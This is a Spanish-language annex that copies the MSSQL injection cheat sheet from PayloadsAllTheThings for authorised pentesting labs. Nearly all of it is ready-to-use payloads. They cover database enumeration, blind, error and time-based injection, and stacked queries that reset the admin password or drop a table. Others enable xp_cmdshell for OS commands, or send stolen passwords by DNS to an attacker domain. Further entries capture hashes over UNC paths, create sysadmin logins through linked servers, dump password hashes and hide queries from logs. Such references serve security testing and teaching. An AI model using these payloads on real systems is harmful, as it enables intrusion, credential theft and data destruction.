# SQL injection: anexo de ejemplos de PayloadsAllTheThings

> **Uso:** elegir el bloque que corresponde al motor, versión y punto de entrada. Las líneas de un bloque pueden ser alternativas. Sustituir hosts, rutas, identificadores y dominios por los del laboratorio o alcance autorizado. Los ejemplos originales son referencias de sintaxis, no pruebas verificadas contra el objetivo.

**Documento de origen:** [SQL Injection/MSSQL Injection.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/SQL%20Injection/MSSQL%20Injection.md), revisión fija 3ac27901c711. **Licencia:** [MIT de Swissky](../../LICENCIA_PATT.md).

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md)

## 1. Inyección MSSQL / MSSQL Comentarios

### Variantes presentes en tablas o texto del apartado

```text
/* MSSQL Comment */
--
;%00
```

## 2. Inyección MSSQL / MSSQL Enumeration

### Variantes presentes en tablas o texto del apartado

```text
SELECT @@version
SELECT DB_NAME()
SELECT SCHEMA_NAME()
SELECT HOST_NAME()
SELECT @@hostname
SELECT @@SERVERNAME
SELECT SERVERPROPERTY('productversion')
SELECT SERVERPROPERTY('productlevel')
SELECT SERVERPROPERTY('edition')
SELECT CURRENT_USER
SELECT user_name();
SELECT system_user;
SELECT user;
```

## 3. MSSQL Enumeration / MSSQL List Databases

```sql
SELECT name FROM master..sysdatabases;
SELECT name FROM master.sys.databases;

-- for N = 0, 1, 2, …
SELECT DB_NAME(N); 

-- Change delimiter value such as ', ' to anything else you want => master, tempdb, model, msdb 
-- (Only works in MSSQL 2017+)
SELECT STRING_AGG(name, ', ') FROM master..sysdatabases; 
```

## 4. MSSQL Enumeration / MSSQL List Tablas

```sql
-- use xtype = 'V' for views
SELECT name FROM master..sysobjects WHERE xtype = 'U';
SELECT name FROM <DBNAME>..sysobjects WHERE xtype='U'
SELECT name FROM someotherdb..sysobjects WHERE xtype = 'U';

-- list column names and types for master..sometable
SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name='sometable';

SELECT table_catalog, table_name FROM information_schema.columns
SELECT table_name FROM information_schema.tables WHERE table_catalog='<DBNAME>'

-- Change delimiter value such as ', ' to anything else you want => trace_xe_action_map, trace_xe_event_map, spt_fallback_db, spt_fallback_dev, spt_fallback_usg, spt_monitor, MSreplication_options  (Only works in MSSQL 2017+)
SELECT STRING_AGG(name, ', ') FROM master..sysobjects WHERE xtype = 'U';
```

## 5. MSSQL Enumeration / MSSQL List Columnas

```sql
-- for the current DB only
SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'mytable');

-- list column names and types for master..sometable
SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name='sometable'; 

SELECT table_catalog, column_name FROM information_schema.columns

SELECT COL_NAME(OBJECT_ID('<DBNAME>.<TABLE_NAME>'), <INDEX>)
```

## 6. Inyección MSSQL / MSSQL Basada en UNION

```sql
    $ SELECT name FROM master..sysdatabases
    [*] Injection
    [*] msdb
    [*] tempdb
```

```sql
    $ SELECT name FROM Injection..sysobjects WHERE xtype = 'U'
    [*] Profiles
    [*] Roles
    [*] Users
```

```sql
    $ SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'Users')
    [*] UserId
    [*] UserName
```

```sql
    SELECT  UserId, UserName from Users
```

## 7. Inyección MSSQL / MSSQL Basada en errores

```sql
    convert(int,@@version)
    cast((SELECT @@version) as int)
```

```sql
    ' + convert(int,@@version) + '
    ' + cast((SELECT @@version) as int) + '
```

### Variantes presentes en tablas o texto del apartado

```text
AND 1337=CONVERT(INT,(SELECT '~'+(SELECT @@version)+'~')) -- -
AND 1337 IN (SELECT ('~'+(SELECT @@version)+'~')) -- -
AND 1337=CONCAT('~',(SELECT @@version),'~') -- -
CAST((SELECT @@version) AS INT)
```

## 8. Inyección MSSQL / MSSQL Ciega Based

```sql
AND LEN(SELECT TOP 1 username FROM tblusers)=5 ; -- -
```

```sql
SELECT @@version WHERE @@version LIKE '%12.0.2000.8%'
WITH data AS (SELECT (ROW_NUMBER() OVER (ORDER BY message)) as row,* FROM log_table)
SELECT message FROM data WHERE row = 1 and message like 't%'
```

## 9. MSSQL Ciega Based / MSSQL Ciega Con Substring Equivalent

```sql
AND ASCII(SUBSTRING(SELECT TOP 1 username FROM tblusers),1,1)=97
AND UNICODE(SUBSTRING((SELECT 'A'),1,1))>64-- 
AND SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables > 'A'
AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)>90
```

### Variantes presentes en tablas o texto del apartado

```text
SUBSTRING('foobar', <START>, <LENGTH>)
```

## 10. Inyección MSSQL / MSSQL Basada en tiempo

```sql
ProductID=1;waitfor delay '0:0:10'--
ProductID=1);waitfor delay '0:0:10'--
ProductID=1';waitfor delay '0:0:10'--
ProductID=1');waitfor delay '0:0:10'--
ProductID=1));waitfor delay '0:0:10'--
```

```sql
IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'
IF 1=1 WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:0';
```

### Variantes presentes en tablas o texto del apartado

```text
WAITFOR DELAY
```

## 11. Inyección MSSQL / MSSQL Stacked Consulta

```sql
    -- multiple SELECT statements
    SELECT 'A'SELECT 'B'SELECT 'C'

    -- updating password with a stacked query
    SELECT id, username, password FROM users WHERE username = 'admin'exec('update[users]set[password]=''a''')--

    -- using the stacked query to enable xp_cmdshell
    -- you won't have the output of the query, redirect it to a file 
    SELECT id, username, password FROM users WHERE username = 'admin'exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
```

```sql
    ProductID=1; DROP members--
```

### Variantes presentes en tablas o texto del apartado

```text
;
```

## 12. MSSQL Archivo Manipulation / MSSQL Read Archivo

```sql
OPENROWSET(BULK 'C:\path\to\file', SINGLE_CLOB)
```

```sql
-1 union select null,(select x from OpenRowset(BULK 'C:\Windows\win.ini',SINGLE_CLOB) R(x)),null,null
```

## 13. MSSQL Archivo Manipulation / MSSQL Write Archivo

```sql
execute spWriteStringToFile 'contents', 'C:\path\to\', 'file'
```

## 14. MSSQL Ejecución de comandos / XP_CMDSHELL

```sql
EXEC xp_cmdshell "net user";
EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:';
EXEC master.dbo.xp_cmdshell 'ping 127.0.0.1';
```

```sql
-- Enable advanced options
EXEC sp_configure 'show advanced options',1;
RECONFIGURE;

-- Enable xp_cmdshell
EXEC sp_configure 'xp_cmdshell',1;
RECONFIGURE;
```

### Variantes presentes en tablas o texto del apartado

```text
xp_cmdshell
```

## 15. MSSQL Ejecución de comandos / Python Script

```powershell
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("getpass").getuser())'
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("os").system("whoami"))'
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(open("C:\\inetpub\\wwwroot\\web.config", "r").read())'
```

### Variantes presentes en tablas o texto del apartado

```text
xp_cmdshell
```

## 16. MSSQL Fuera de banda / MSSQL DNS Extracción de datos

```powershell
    1 and exists(select * from fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select pass from users where id=1)%2b'.[ATTACKER.DOMAIN.TLD]\1.xem',null,null))
```

```powershell
    1 (select 1 where exists(select * from fn_get_audit_file('\\'%2b(select pass from users where id=1)%2b'.[ATTACKER.DOMAIN.TLD]\',default,default)))
    1 and exists(select * from fn_trace_gettable('\\'%2b(select pass from users where id=1)%2b'.[ATTACKER.DOMAIN.TLD]\1.trc',default))
```

## 17. MSSQL Fuera de banda / MSSQL UNC Path

```sql
1'; use master; exec xp_dirtree '\\10.10.10.10\SHARE';-- 
```

```sql
xp_dirtree '\\10.10.10.10\file'
xp_fileexist '\\10.10.10.10\file'
BACKUP LOG [TESTING] TO DISK = '\\10.10.10.10\file'
BACKUP DATABASE [TESTING] TO DISK = '\\10.10.10.10\file'
RESTORE LOG [TESTING] FROM DISK = '\\10.10.10.10\file'
RESTORE DATABASE [TESTING] FROM DISK = '\\10.10.10.10\file'
RESTORE HEADERONLY FROM DISK = '\\10.10.10.10\file'
RESTORE FILELISTONLY FROM DISK = '\\10.10.10.10\file'
RESTORE LABELONLY FROM DISK = '\\10.10.10.10\file'
RESTORE REWINDONLY FROM DISK = '\\10.10.10.10\file'
RESTORE VERIFYONLY FROM DISK = '\\10.10.10.10\file'
```

### Variantes presentes en tablas o texto del apartado

```text
xp_dirtree
```

## 18. Inyección MSSQL / MSSQL Trusted Links

```sql
    select * from master..sysservers
```

```sql
    select * from openquery("dcorp-sql1", 'select * from master..sysservers')
    select version from openquery("linkedserver", 'select @@version as version')

    -- Chain multiple openquery
    select version from openquery("link1",'select version from openquery("link2","select @@version as version")')
```

```sql
    -- Enable xp_cmdshell and execute "dir" command
    EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT LinkedServer
    select 1 from openquery("linkedserver",'select 1;exec master..xp_cmdshell "dir c:"')

    -- Create a SQL user and give sysadmin privileges
    EXECUTE('EXECUTE(''CREATE LOGIN User WITH PASSWORD = ''''Password123'''' '') AT "DOMAIN\SQL01"') AT "DOMAIN\SQL02"
    EXECUTE('EXECUTE(''sp_addsrvrolemember ''''User'''' , ''''sysadmin'''' '') AT "DOMAIN\SQL01"') AT "DOMAIN\SQL02"
```

## 19. MSSQL Privileges / MSSQL List Permissions

```sql
    SELECT * FROM fn_my_permissions(NULL, 'SERVER'); 
```

```sql
    SELECT * FROM fn_my_permissions (NULL, 'DATABASE');
```

```sql
    SELECT * FROM fn_my_permissions('Sales.vIndividualCustomer', 'OBJECT') ORDER BY subentity_name, permission_name; 
```

```sql
    -- possible roles: sysadmin, serveradmin, dbcreator, setupadmin, bulkadmin, securityadmin, diskadmin, public, processadmin
    SELECT is_srvrolemember('sysadmin');
```

## 20. MSSQL Privileges / MSSQL Make User DBA

```sql
EXEC master.dbo.sp_addsrvrolemember 'User', 'sysadmin';
```

## 21. Inyección MSSQL / MSSQL Base de datos Credentials

```sql
    SELECT name, password FROM master..sysxlogins
    SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins 
    -- Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer
```

```sql
    SELECT name, password_hash FROM master.sys.sql_logins
    SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins
```

### Variantes presentes en tablas o texto del apartado

```text
0x01002702560500000000000000000000000000000000000000008db43dd9b1972a636ad0c7d4b8c515cb8ce46578
0x010018102152f8f28c8499d8ef263c53f8be369d799f931b2fbe
```

## 22. Inyección MSSQL / MSSQL OPSEC

```sql
-- 'sp_password' was found in the text of this event.
-- The text has been replaced with this comment for security reasons.
```

### Variantes presentes en tablas o texto del apartado

```text
SP_PASSWORD
' AND 1=1--sp_password
```

---

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md) · [Licencia de origen](../../LICENCIA_PATT.md)
